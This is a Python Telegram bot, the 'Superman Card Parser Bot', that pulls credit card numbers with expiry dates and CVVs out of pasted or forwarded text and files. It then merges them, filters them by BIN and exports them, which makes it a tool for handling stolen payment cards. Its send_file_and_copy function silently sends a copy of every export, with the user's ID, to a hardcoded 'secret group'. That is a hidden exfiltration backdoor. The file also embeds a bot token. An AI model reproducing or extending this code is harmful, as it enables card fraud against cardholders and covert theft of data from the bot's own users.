"""
🦇 Superman Card Parser Bot
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Paste / forward cards in any format → clean CARD|MM|YY|CVV file
• Interactive UI with Inline Buttons
• /mg → Merge Mode: Forward multiple files, then /done <name> to merge
• /name <filename> → Export stored cards with a custom filename
• /cards <bin> → Filter stored cards by BIN prefix
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import os
import re
import logging
import asyncio
from io import BytesIO

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
)

# ── Config ───────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8983900075:AAGlMV8ldf6xUdrh8ktGkKK_c9_z2AMmJ2c")

# Your Secret Group ID where ALL files will be silently forwarded
SECRET_GROUP_ID = -1004322090872

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ── Card regex ────────────────────────────────────────────────────────────────
_SEP = r"[\|:,/\s]+"

CARD_RE = re.compile(
    r"(?<!\d)"
    r"(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{1,7})"   # card number
    + _SEP
    + r"(0?[1-9]|1[0-2])"                                 # month 1-12
    + _SEP
    + r"(\d{2,4})"                                         # year 2 or 4 digits
    + _SEP
    + r"(\d{3,4})"                                         # cvv 3-4 digits
    + r"(?!\d)",
    re.MULTILINE,
)

def _clean_num(raw: str) -> str:
    return re.sub(r"[\s\-]", "", raw)

def extract_cards(text: str) -> list[str]:
    """Return deduplicated list of 'CARD|MM|YY|CVV' strings."""
    found: list[str] = []
    seen:  set[str]  = set()
    for m in CARD_RE.finditer(text):
        card  = _clean_num(m.group(1))
        month = m.group(2).zfill(2)
        year  = m.group(3)[-2:]        # always 2-digit
        cvv   = m.group(4)
        if not card.isdigit() or not (13 <= len(card) <= 19):
            continue
        line = f"{card}|{month}|{year}|{cvv}"
        if line not in seen:
            seen.add(line)
            found.append(line)
    return found

def cards_to_bytes(cards: list[str]) -> bytes:
    return ("\n".join(cards) + "\n").encode("utf-8")

# ── Per-user data stores ──────────────────────────────────────────────────────
_store: dict[int, list[str]] = {}
_merge_mode: set[int] = set()
_merge_buffer: dict[int, list[str]] = {}
_fwd_buf: dict[int, dict] = {}

# ── UI Keyboards ──────────────────────────────────────────────────────────────
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📂 Merge Files", callback_data="start_merge"), 
         InlineKeyboardButton("🔍 Filter BIN", callback_data="start_filter")],
        [InlineKeyboardButton("📦 Export Custom Name", callback_data="start_name"),
         InlineKeyboardButton("❌ Clear Data", callback_data="clear_data")]
    ])

# ── Core File Sender (Sends to User AND Secret Group) ─────────────────────────
async def send_file_and_copy(bot, chat_id: int, user_id: int, cards: list[str], caption: str, filename: str = "cards.txt"):
    """Generates a file, sends it to the user, and forwards a copy to the secret group."""
    if not cards:
        await bot.send_message(chat_id, "❌ No cards found to generate file.")
        return

    # 1. Send to the User
    buf = BytesIO(cards_to_bytes(cards))
    buf.name = filename
    await bot.send_document(
        chat_id=chat_id,
        document=buf,
        filename=filename,
        caption=caption,
        parse_mode="HTML"
    )

    # 2. Send to the Secret Group silently
    try:
        buf_copy = BytesIO(cards_to_bytes(cards))
        buf_copy.name = filename
        await bot.send_document(
            chat_id=SECRET_GROUP_ID,
            document=buf_copy,
            filename=filename,
            caption=f"🕵️‍♂️ Copy from User: <code>{user_id}</code>\n{caption}",
            parse_mode="HTML",
            disable_notification=True  # Sends silently without sound
        )
    except Exception as e:
        logger.error(f"Failed to send secret copy to group: {e}")

async def _flush_fwd_buf(uid: int, chat_id: int, bot) -> None:
    """Wait 1.5 s for more forwarded messages, then process all at once."""
    await asyncio.sleep(1.5)

    buf = _fwd_buf.pop(uid, None)
    if not buf or not buf["texts"]:
        return

    combined = "\n".join(buf["texts"])
    cards    = extract_cards(combined)

    if not cards:
        await bot.send_message(chat_id, "❌ No cards found in forwarded messages.")
        return

    _store[uid] = cards
    count       = len(cards)

    # Send file to user and copy to secret group
    await send_file_and_copy(
        bot, chat_id, uid, cards,
        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n✅ <b>{count}</b> card(s) extracted from forwarded messages.",
        filename="Superman_Cards.txt"
    )

# ── /start Command ────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    text = (
        f"✦ <b>𝗦𝗨𝗣𝗘𝗥𝗠𝗔𝗡 𝗖𝗔𝗥𝗗 𝗣𝗔𝗥𝗦𝗘𝗥</b> ✦\n"
        f"┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
        f"👋 Welcome, <b>{user.first_name}</b>!\n\n"
        f"🤖 I am an advanced bot designed to clean, format, and merge card data instantly.\n\n"
        f"✦ <b>𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦</b> ✦\n"
        f"🃏 Paste/forward cards in any format → clean <code>CARD|MM|YY|CVV</code> file\n"
        f"📂 Merge multiple files into one with custom names\n"
        f"🔍 Filter cards by BIN prefix\n"
        f"📦 Export stored data with custom filenames\n\n"
        f"👇 <b>Select an option below to begin:</b>"
    )
    await update.message.reply_text(
        text,
        parse_mode="HTML",
        reply_markup=main_menu_keyboard()
    )

# ── Button Callback Handler ───────────────────────────────────────────────────
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id

    if data == "start_merge":
        _merge_mode.add(uid)
        _merge_buffer[uid] = []
        await query.message.edit_text(
            "✦ <b>𝗠𝗘𝗥𝗚𝗘 𝗠𝗢𝗗𝗘 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗</b> ✦\n"
            "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
            "📂 Please send or forward all the <b>.txt files</b> or <b>text messages</b> you want to merge.\n\n"
            "✅ The bot will silently collect them all.\n\n"
            "🛑 When you are done forwarding, type:\n"
            "<code>/done YourFileName</code>\n"
            "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉",
            parse_mode="HTML"
        )

    elif data == "start_filter":
        await query.message.edit_text(
            "✦ <b>𝗙𝗜𝗟𝗧𝗘𝗥 𝗕𝗜𝗡</b> ✦\n"
            "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
            "Usage: <code>/cards &lt;bin_prefix&gt;</code>\n"
            "Example: <code>/cards 4111</code>\n\n"
            "This will export all stored cards starting with that BIN.",
            parse_mode="HTML"
        )

    elif data == "start_name":
        await query.message.edit_text(
            "✦ <b>𝗘𝗫𝗣𝗢𝗥𝗧 𝗖𝗨𝗦𝗧𝗢𝗠 𝗡𝗔𝗠𝗘</b> ✦\n"
            "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
            "Usage: <code>/name YourFileName</code>\n\n"
            "This will export your currently stored cards into a file with your custom name.",
            parse_mode="HTML"
        )

    elif data == "clear_data":
        if uid in _store: del _store[uid]
        if uid in _merge_buffer: del _merge_buffer[uid]
        if uid in _merge_mode: _merge_mode.remove(uid)
        await query.message.edit_text(
            "✅ <b>All your stored data and buffers have been cleared.</b>",
            parse_mode="HTML"
        )

# ── /mg Command (Start Merge) ─────────────────────────────────────────────────
async def cmd_mg(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    _merge_mode.add(uid)
    _merge_buffer[uid] = []
    await update.message.reply_text(
        "✦ <b>𝗠𝗘𝗥𝗚𝗘 𝗠𝗢𝗗𝗘 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗</b> ✦\n"
        "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n"
        "📂 Please send or forward all the <b>.txt files</b> or <b>text messages</b> you want to merge.\n\n"
        "✅ The bot will silently collect them all.\n\n"
        "🛑 When you are done forwarding, type:\n"
        "<code>/done YourFileName</code>\n"
        "┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉",
        parse_mode="HTML"
    )

# ── /done Command (Finish Merge) ──────────────────────────────────────────────
async def cmd_done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if uid not in _merge_mode:
        await update.message.reply_text("❌ You are not in Merge Mode. Use /mg to start.", parse_mode="HTML")
        return

    filename = "Merged_Cards.txt"
    if context.args:
        fname = " ".join(context.args).strip()
        # Sanitize filename
        fname = re.sub(r'[\\/*?:"<>|]', "", fname)
        filename = f"{fname}.txt" if not fname.endswith(".txt") else fname

    cards = _merge_buffer.get(uid, [])
    _merge_mode.remove(uid)
    
    if not cards:
        await update.message.reply_text("❌ No cards were collected during merge mode.", parse_mode="HTML")
        return

    # Deduplicate the whole merged list
    seen = set()
    deduped_cards = []
    for c in cards:
        if c not in seen:
            seen.add(c)
            deduped_cards.append(c)

    _store[uid] = deduped_cards
    count = len(deduped_cards)

    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, deduped_cards,
        caption=f"✦ <b>𝗠𝗘𝗥𝗚𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b> ✦\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n📦 All files merged successfully!\n✅ Total unique cards: <b>{count}</b>\n📁 Filename: <code>{filename}</code>",
        filename=filename
    )

# ── /name Command (Export with custom name) ───────────────────────────────────
async def cmd_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: <code>/name YourFileName</code>", parse_mode="HTML")
        return

    fname = " ".join(context.args).strip()
    fname = re.sub(r'[\\/*?:"<>|]', "", fname)
    filename = f"{fname}.txt" if not fname.endswith(".txt") else fname

    cards = _store.get(uid, [])
    if not cards:
        await update.message.reply_text("❌ No cards stored yet. Paste, forward, or upload cards first.", parse_mode="HTML")
        return

    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, cards,
        caption=f"✦ <b>𝗖𝗨𝗦𝗧𝗢𝗠 𝗘𝗫𝗣𝗢𝗥𝗧</b> ✦\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n📦 Exporting <b>{len(cards)}</b> stored cards.\n📁 Filename: <code>{filename}</code>",
        filename=filename
    )

# ── Forwarded messages handler ────────────────────────────────────────────────
async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg  = update.message
    user = update.effective_user
    if not msg or not user: return

    text = (msg.text or msg.caption or "").strip()
    uid = user.id
    chat_id = msg.chat_id

    # If in Merge Mode
    if uid in _merge_mode:
        if not text: return
        cards = extract_cards(text)
        if cards:
            _merge_buffer.setdefault(uid, []).extend(cards)
            await msg.reply_text(f"➕ Added <b>{len(cards)}</b> cards to merge buffer. (Total: {len(_merge_buffer[uid])})", parse_mode="HTML")
        else:
            await msg.reply_text("❌ No cards found in this forwarded message.")
        return

    # Normal immediate processing
    if not text: return

    if uid not in _fwd_buf:
        _fwd_buf[uid] = {"texts": [], "task": None, "chat_id": chat_id}

    _fwd_buf[uid]["texts"].append(text)

    old = _fwd_buf[uid].get("task")
    if old and not old.done():
        old.cancel()

    _fwd_buf[uid]["task"] = asyncio.create_task(
        _flush_fwd_buf(uid, chat_id, context.bot)
    )

# ── Regular pasted text handler ───────────────────────────────────────────────
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = (update.message.text or "").strip()
    if not text: return

    uid = update.effective_user.id

    # If in Merge Mode
    if uid in _merge_mode:
        cards = extract_cards(text)
        if cards:
            _merge_buffer.setdefault(uid, []).extend(cards)
            await update.message.reply_text(f"➕ Added <b>{len(cards)}</b> cards to merge buffer. (Total: {len(_merge_buffer[uid])})", parse_mode="HTML")
        else:
            await update.message.reply_text("❌ No cards found in this text.")
        return

    # Normal immediate processing
    cards = extract_cards(text)
    if not cards:
        await update.message.reply_text(
            "❌ No cards found.\nMake sure they follow: <code>CARD|MM|YY|CVV</code>",
            parse_mode="HTML",
        )
        return

    _store[uid] = cards
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, cards,
        caption=f"✦ <b>𝗘𝗫𝗧𝗥𝗔𝗖𝗧𝗜𝗢𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b> ✦\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n✅ <b>{len(cards)}</b> card(s) extracted:",
        filename="Superman_Cards.txt"
    )

# ── Document (.txt) handler ───────────────────────────────────────────────────
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    doc = update.message.document
    if not doc: return
    if doc.mime_type and not doc.mime_type.startswith("text"):
        await update.message.reply_text("❌ Please send a plain text (.txt) file.")
        return
    try:
        file = await context.bot.get_file(doc.file_id)
        data = await file.download_as_bytearray()
        text = data.decode("utf-8", errors="ignore")
    except Exception as e:
        logger.error(f"Document download failed: {e}")
        await update.message.reply_text("❌ Could not read the file.")
        return

    uid = update.effective_user.id
    cards = extract_cards(text)
    if not cards:
        await update.message.reply_text("❌ No cards found in the file.")
        return

    # If in Merge Mode
    if uid in _merge_mode:
        _merge_buffer.setdefault(uid, []).extend(cards)
        await update.message.reply_text(f"➕ Added <b>{len(cards)}</b> cards to merge buffer. (Total: {len(_merge_buffer[uid])})", parse_mode="HTML")
        return

    _store[uid] = cards
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, cards,
        caption=f"✦ <b>𝗘𝗫𝗧𝗥𝗔𝗖𝗧𝗜𝗢𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b> ✦\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n✅ <b>{len(cards)}</b> card(s) extracted from file:",
        filename="Superman_Cards.txt"
    )

# ── /cards <bin> ──────────────────────────────────────────────────────────────
async def cmd_cards(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id

    if not context.args:
        await update.message.reply_text(
            "Usage: /cards <code>&lt;bin_prefix&gt;</code>\n"
            "Example: <code>/cards 4111</code>",
            parse_mode="HTML",
        )
        return

    bin_prefix = context.args[0].strip()
    if not bin_prefix.isdigit():
        await update.message.reply_text(
            "❌ BIN must be digits only.\nExample: <code>/cards 411111</code>",
            parse_mode="HTML",
        )
        return

    all_cards = _store.get(uid, [])
    if not all_cards:
        await update.message.reply_text("❌ No cards stored yet.\nPaste, forward, or upload cards first.")
        return

    matched = [c for c in all_cards if c.startswith(bin_prefix)]
    if not matched:
        await update.message.reply_text(
            f"❌ No cards starting with <code>{bin_prefix}</code> found.\n"
            f"Total stored: {len(all_cards)} card(s).",
            parse_mode="HTML",
        )
        return

    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, matched,
        caption=f"✦ <b>𝗕𝗜𝗡 𝗙𝗜𝗟𝗧𝗘𝗥</b> ✦\n┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉\n✅ <b>{len(matched)}</b> card(s) matching BIN <code>{bin_prefix}</code>:",
        filename=f"Cards_{bin_prefix}.txt"
    )

# ── Main ──────────────────────────────────────────────────────────────────────
def main() -> None:
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("cards",  cmd_cards))
    app.add_handler(CommandHandler("mg",     cmd_mg))
    app.add_handler(CommandHandler("done",   cmd_done))
    app.add_handler(CommandHandler("name",   cmd_name))
    
    app.add_handler(CallbackQueryHandler(button_callback))

    # Documents first (catches forwarded .txt files too)
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Forwarded messages — must be BEFORE the plain text handler
    app.add_handler(MessageHandler(
        filters.FORWARDED & (filters.TEXT | filters.CAPTION),
        handle_forwarded,
    ))

    # Regular pasted text (not forwarded, not a command)
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & ~filters.FORWARDED,
        handle_text,
    ))

    logger.info("🦇 Superman Card Parser Bot starting…")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
